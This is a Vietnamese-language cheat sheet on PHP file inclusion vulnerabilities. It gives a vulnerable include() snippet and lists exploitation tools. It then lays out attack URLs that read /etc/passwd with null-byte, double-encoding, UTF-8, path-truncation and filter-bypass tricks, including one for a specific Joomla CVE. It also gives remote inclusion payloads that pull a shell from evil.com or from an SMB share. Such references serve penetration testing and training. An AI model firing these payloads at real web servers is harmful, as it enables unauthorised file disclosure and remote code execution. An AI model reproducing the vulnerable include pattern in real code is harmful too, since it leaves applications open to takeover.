# File Inclusion (Chèn Tệp)

> File Inclusion Vulnerability là một loại lỗ hổng bảo mật trong các ứng dụng web, phổ biến đặc biệt trong các ứng dụng được phát triển bằng PHP, nơi kẻ tấn công có thể nhúng (include) một tệp, thường là khai thác việc thiếu kiểm tra hợp lệ đầu vào/đầu ra đúng cách. Lỗ hổng này có thể dẫn đến nhiều hoạt động độc hại, bao gồm thực thi mã, đánh cắp dữ liệu, và làm biến dạng website (defacement).

## Tóm tắt

- [Công cụ](#tools)
- [Local File Inclusion](#local-file-inclusion)
    - [Null Byte](#null-byte)
    - [Double Encoding](#double-encoding)
    - [UTF-8 Encoding](#utf-8-encoding)
    - [Cắt xén đường dẫn (Path Truncation)](#path-truncation)
    - [Vượt qua bộ lọc (Filter Bypass)](#filter-bypass)
- [Remote File Inclusion](#remote-file-inclusion)
    - [Null Byte](#null-byte-1)
    - [Double Encoding](#double-encoding-1)
    - [Vượt qua allow_url_include](#bypass-allow_url_include)
- [Labs](#labs)
- [Tài liệu tham khảo](#references)

## Công cụ

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (đã lưu trữ vào ngày 7 tháng 10, 2020) - kadimus là một công cụ để kiểm tra và khai thác lỗ hổng lfi.
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Công cụ khai thác LFI hoàn toàn tự động (+ Reverse Shell) và quét lỗ hổng
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap là một công cụ python nhỏ có thể tìm kiếm, chuẩn bị, kiểm tra, khai thác và thậm chí tự động google để tìm các lỗi local và remote file inclusion trong các ứng dụng web.
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic là một công cụ kiểm thử xâm nhập mã nguồn mở tự động hóa quá trình tìm kiếm và truy xuất nội dung của các tệp log và cấu hình phổ biến thông qua các lỗ hổng path traversal.
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Công cụ phát hiện và khai thác Local File Inclusion

## Local File Inclusion

**File Inclusion Vulnerability** cần được phân biệt với **Path Traversal**. Lỗ hổng Path Traversal cho phép kẻ tấn công truy cập vào một tệp, thường là khai thác cơ chế "đọc" được triển khai trong ứng dụng mục tiêu, trong khi File Inclusion sẽ dẫn đến việc thực thi mã tùy ý.

Hãy xem xét một script PHP nhúng (include) một tệp dựa trên đầu vào của người dùng. Nếu không có kiểm tra hợp lệ đúng cách, kẻ tấn công có thể thao túng tham số `page` để nhúng các tệp cục bộ hoặc từ xa, dẫn đến truy cập trái phép hoặc thực thi mã.

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

Trong các ví dụ sau đây, chúng ta nhúng tệp `/etc/passwd`, hãy xem chương `Directory & Path Traversal` để biết thêm các tệp thú vị khác.

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Null Byte

:warning: Trong các phiên bản PHP dưới 5.3.4, chúng ta có thể kết thúc bằng null byte (`%00`).

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**Ví dụ**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 Encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### Cắt xén đường dẫn (Path Truncation)

Trên hầu hết các bản cài đặt PHP, một tên tệp dài hơn `4096` byte sẽ bị cắt bớt, do đó bất kỳ ký tự dư thừa nào cũng sẽ bị loại bỏ.

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Vượt qua bộ lọc (Filter Bypass)

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## Remote File Inclusion

> Remote File Inclusion (RFI) là một loại lỗ hổng xảy ra khi một ứng dụng nhúng (include) một tệp từ xa, thường là thông qua đầu vào của người dùng, mà không kiểm tra hợp lệ hoặc khử trùng đầu vào đúng cách.

Remote File Inclusion không còn hoạt động trên cấu hình mặc định nữa vì `allow_url_include` hiện đã bị vô hiệu hóa kể từ PHP 5.

```ini
allow_url_include = On
```

Hầu hết các cách vượt bộ lọc (filter bypass) từ phần LFI có thể được tái sử dụng cho RFI.

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null Byte

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Vượt qua allow_url_include

Khi `allow_url_include` và `allow_url_fopen` được đặt thành `Off`. Vẫn có thể nhúng một tệp từ xa trên máy Windows bằng cách sử dụng giao thức `smb`.

1. Tạo một share mở cho mọi người
2. Viết mã PHP bên trong một tệp: `shell.php`
3. Nhúng nó `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## Labs

- [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
- [Root Me - Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
- [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
- [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## Tài liệu tham khảo

- [CVV #1: Local File Inclusion - SI9INT - June 20, 2018](https://web.archive.org/web/20200724150218/https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
- [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - May 12, 2019](https://web.archive.org/web/20260220172333/https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
- [Is PHP vulnerable and under what conditions? - Andreas Venieris - April 13, 2015](https://web.archive.org/web/20250209181954/http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
- [LFI Cheat Sheet - @Arr0way - April 24, 2016](https://web.archive.org/web/20180121083456/https://highon.coffee/blog/lfi-cheat-sheet/)
- [Testing for Local File Inclusion - OWASP - June 25, 2017](https://web.archive.org/web/20131021005706/https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [Turning LFI into RFI - Grayson Christopher - August 14, 2017](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)
